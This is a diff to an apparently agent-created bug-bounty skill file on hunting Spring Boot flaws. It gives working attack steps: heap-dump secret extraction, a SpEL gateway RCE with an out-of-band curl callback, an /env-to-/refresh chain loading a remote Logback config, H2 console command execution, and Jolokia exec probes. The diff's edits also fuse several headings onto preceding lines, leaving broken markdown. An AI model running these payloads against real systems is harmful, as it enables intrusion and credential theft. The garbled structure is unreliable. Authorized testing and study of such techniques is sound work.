@@ -4,14 +4,13 @@ description: "Hunt Actuator exposure, SpEL injection, H2 console RCE, Jolokia an
 agent_created: true
 ---
 
-# Spring Boot-specific vulnerability hunting — unified skill
+# Spring Boot-specific vulnerability hunting — unified methodology
 
-> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 2 upstream skills across cbh, hunting. Payloads, wordlists and supporting data are in `references/`.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for
 
 - **Scale / likelihood (Wiz, Dec 2024):** ~**92,000** internet-facing Spring Boot Actuator endpoints; Actuator appears in ~60% of cloud environments, ~11% have a publicly exposed instance, and **24% of those exposed have a misconfigured instance**. GreyNoise saw ~1K malicious IPs scanning for Actuator in a 30-day window. This is not a rare finding — it is a mass-scanned surface.
@@ -27,10 +26,7 @@ agent_created: true
 - **Fingerprints:** `X-Application-Context` header, Whitelabel Error Page, `/actuator` JSON, `spring-boot` favicon hash (Shodan `http.favicon.hash:116323821`), Java stack traces with `org.springframework` paths, `JSESSIONID`.
 - **Alternate base paths to sweep:** `/manage/actuator`, `/management/actuator`, `/app/actuator` (already in the baseline Phase 1 loop) plus the bare `/heapdump`, `/env`, `/gateway/routes`, `/jolokia`, `/h2-console` roots used by older or reverse-proxied deployments. A path prefix in front of `/actuator` is the most common reason a scanner misses an exposed instance.
 - **Cloud-context amplifier:** Wiz's graph analysis shows a misconfigured Actuator is graded far higher when the resource has a high-privilege attached role or the leaked keys grant broad cloud control. When triaging, follow the extracted AWS/GCP/Azure credential to its real permissions (cross-reference `cloud-iam-deep`) rather than stopping at "keys present in heap."
-- **Health/info are not harmless:** `/actuator/health` can expose internal dependency endpoints and DB status; `/actuator/metrics` (Wiz example `http.client.requests`) leaked internal IPs and a "session" endpoint pattern. Grade these Low/Medium recon, not Critical.
-
-### Signals and surfaces
-
+- **Health/info are not harmless:** `/actuator/health` can expose internal dependency endpoints and DB status; `/actuator/metrics` (Wiz example `http.client.requests`) leaked internal IPs and a "session" endpoint pattern. Grade these Low/Medium recon, not Critical.### Signals and surfaces
 ### Crown Jewel Targets
 
 Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.
@@ -43,10 +39,7 @@ Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets i
 - **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
 - **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### B. Techniques & bypasses — specific actionable techniques/payload shapes
 
 - **Heap-dump credential mining (Wiz commands):**
@@ -61,10 +54,7 @@ strings heapdump | grep -E "^Host:\s+\S+$" -C 10    # captured cookies / session
 - **CVE-2022-22947 RCE:** the route body's filter `args` are SpEL-injected; the **`/refresh` request is what triggers evaluation**. Use an OOB callback (`curl COLLAB_HOST/gw-rce`) rather than expecting command output. Confirm the route was created by reading `/actuator/gateway/routes` before refresh.
 - **Writable `/env` → `/refresh` gadget chain:** POST `{"name":"logging.config","value":"http://COLLAB/logback.xml"}` (Logback JNDI) or `{"name":"eureka.client.serviceUrl.defaultZone","value":"http://COLLAB/x"}` (Eureka XStream deserialization), then POST `/actuator/refresh`. Watch for the callback; a 200 on `/env` alone proves property injection, not RCE.
 - **Jolokia / MBeans:** `/jolokia/list` then `read java.lang:type=Runtime/SystemProperties` for secrets; `exec` on `com.sun.management:type=DiagnosticCommand` or the MLet MBean for code execution. `/actuator/jolokia` is the alternate path.
-- **H2 console RCE:** `CREATE ALIAS EXEC AS $$ ... Runtime.getRuntime() ... $$; CALL EXEC('id');` — the alias body must return a String or no output is reflected.
-
-### Validation and proof
-
+- **H2 console RCE:** `CREATE ALIAS EXEC AS $$ ... Runtime.getRuntime() ... $$; CALL EXEC('id');` — the alias body must return a String or no output is reflected.### Validation and proof
 ### Validation
 
 ✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
@@ -103,10 +93,7 @@ strings heapdump | grep -E "^Host:\s+\S+$" -C 10    # captured cookies / session
 - SpEL RCE: Critical
 - H2 console RCE: Critical
 - Actuator env (passwords exposed): High
-- Mappings disclosure only: Low-Medium
-
-### Escalation and related chains
-
+- Mappings disclosure only: Low-Medium### Escalation and related chains
 ### Chain Table
 
 | Spring Boot finding | Chain to | Impact |
@@ -118,10 +105,7 @@ strings heapdump | grep -E "^Host:\s+\S+$" -C 10    # captured cookies / session
 | Spring4Shell | Write webshell → RCE | Critical |
 | Jolokia + MLet | Remote code via MBean | Critical RCE |
 
----
-
-### Sources and related reading
-
+---### Sources and related reading
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://www.wiz.io/blog/spring-boot-actuator-misconfigurations
@@ -133,10 +117,7 @@ strings heapdump | grep -E "^Host:\s+\S+$" -C 10    # captured cookies / session
 7. https://www.sentinelone.com/vulnerability-database/cve-2026-40976/
 8. https://www.eclipse.org/mat/
 9. https://www.herodevs.com/vulnerability-directory/cve-2026-59284
-10. https://www.trendmicro.com/en/research/26/c/from-misconfigured-spring-boot-actuator-to-sharepoint-exfiltrati.html
-
-### Additional notes
-
+10. https://www.trendmicro.com/en/research/26/c/from-misconfigured-spring-boot-actuator-to-sharepoint-exfiltrati.html### Additional notes
 ### Phase 1 — Fingerprint Spring Boot
 
 ```bash
@@ -329,16 +310,8 @@ curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" |
 curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
 ```
 
----
+---## Probes
 
-## Source skills merged into this topic
+## Supporting data
 
-- `hunting` — `springboot`
-- `cbh` — `hunt-springboot`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
